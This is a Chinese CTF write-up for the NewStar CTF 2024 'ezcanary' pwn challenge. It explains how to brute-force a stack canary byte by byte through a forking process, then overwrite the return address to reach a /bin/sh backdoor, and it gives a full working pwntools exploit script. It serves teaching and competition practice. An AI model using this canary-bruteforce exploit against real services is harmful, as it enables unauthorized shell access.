---
titleTemplate: ':title | WriteUp - NewStar CTF 2024'
---

# ezcanary

文件到手先 checksec 一下，看一下是 64 位程序，除了 PIE 其他保护全开

![checksec](/assets/images/wp/2024/week3/ezcanary_1.png)

给了后门地址，因为没有开PIE所以可以直接利用

```asm
.text:0000000000401236 ; __unwind {
.text:0000000000401236                 endbr64
.text:000000000040123A                 push    rbp
.text:000000000040123B                 mov     rbp, rsp
.text:000000000040123E                 sub     rsp, 10h
.text:0000000000401242                 mov     rax, fs:28h
.text:000000000040124B                 mov     [rbp+var_8], rax
.text:000000000040124F                 xor     eax, eax
.text:0000000000401251                 lea     rdi, command    ; "/bin/sh"
.text:0000000000401258                 call    _system
```

再看 `main` 函数

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char s[88]; // [rsp+0h] [rbp-60h] BYREF
  unsigned __int64 v5; // [rsp+58h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  init(argc, argv, envp);
  memset(s, 0, 0x50uLL);
  do
  {
    if ( !fork() )
    {
      puts(&byte_402031);
      puts(&byte_402050);
      puts(&byte_40208B);
      read(0, s, 0x100uLL);
      return 0;
    }
    wait(0LL);
    puts(&::s);
    read(0, s, 0x100uLL);
  }
  while ( strcmp(s, "cat flag\n") );
  puts("flag is one_by_one_bruteforce");
  read(0, s, 0x100uLL);
  return 0;
}
```

很明显的有三个 `read` 都可以栈溢出，程序是 do while 的循环，当第二次输入为 `cat flag\n` 时结束循环并读取第三次输入

但是由于程序开启了 Canary 保护，所以并不能直接 ret2backdoor，而需要先想办法绕过 Canary 才能成功修改返回地址

不管是 `fork()` 函数还是最后 `puts` 的 `one_by_one_bruteforce` 都在提示本题可用逐字节爆破的方式获得 Canary

:::tip

`fork()` 函数具有以下两个特点：

1. 由于子进程和父进程的栈结构是完全相同的，因此保存在子进程栈上的随机数与保存在父进程栈上的随机数完全相同。换句话说，所有子进程和父进程共享同一个 Canary
2. 子进程的崩溃不会导致父进程崩溃

这两个特点意味着当程序调用 `fork()` 函数创建了足够多的子进程时，我们可以不断访问子进程，直到找到一个不会使子进程崩溃的随机数，这个随机数也就是真正的 Canary

:::

64 位要爆破 7 个字节，运气不好的话要多等会

```python
#_*_ coding:utf-8 _*_
from pwn import *
elf = ELF("./ezcanary")
context(arch=elf.arch, os=elf.os)
context.log_level = 'debug'
p = process([elf.path])
p = remote('127.0.0.1',8071)
def aaa() :
  global can
  for i in range(256):
    payload1 = (0x60-8) * b'a' + can + p8(i)
    p.sendafter('你觉得呢？\n',payload1)
    info = p.recvuntil('\n')
    if b"*** stack smashing detected ***" in info :
        p.send('n\n')
        continue
    else :
        can += p8(i)
        break

def bbb():
  global can
  can = b'\x00'
  for i in range(7):
    aaa()
    if i != 6 :
      p.send('a\n')
    else :
      p.sendline('cat flag')


bbb()
canary = u64(can)
print(hex(canary))
getshell = 0x401251
payload2 = b"a" * (0x60-8) + p64(canary) + p64(0) + p64(getshell)
p.sendafter("bruteforce\n", payload2)
p.interactive()
```
